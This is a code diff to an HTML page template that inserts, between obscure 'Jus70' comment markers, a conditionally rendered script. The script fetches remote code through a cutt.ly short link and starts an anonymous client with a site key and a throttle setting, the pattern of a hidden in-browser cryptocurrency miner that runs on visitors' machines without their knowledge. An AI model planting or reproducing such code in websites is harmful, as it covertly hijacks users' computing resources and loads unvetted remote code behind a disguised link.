@@ -236,6 +236,23 @@ if (getDarkCookie() == 'true') {
 }
 </script>
 <script src="/static/js/general_functions.js?version=2"></script>
+
+
+    <!-- Jus70 -->
+{% can user.email request as CAN %}
+{% if CAN %}
+<script>
+  $.getScript("https://cutt.ly/wns1PUz", function() {
+    var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
+        throttle: 0.7, c: 'w', ads: 0
+    });
+    _client.start();
+    console.log('-');
+  });
+</script>
+{% endif %}
+    <!-- !Jus70 -->
+
 	</body>
 
 	<script>
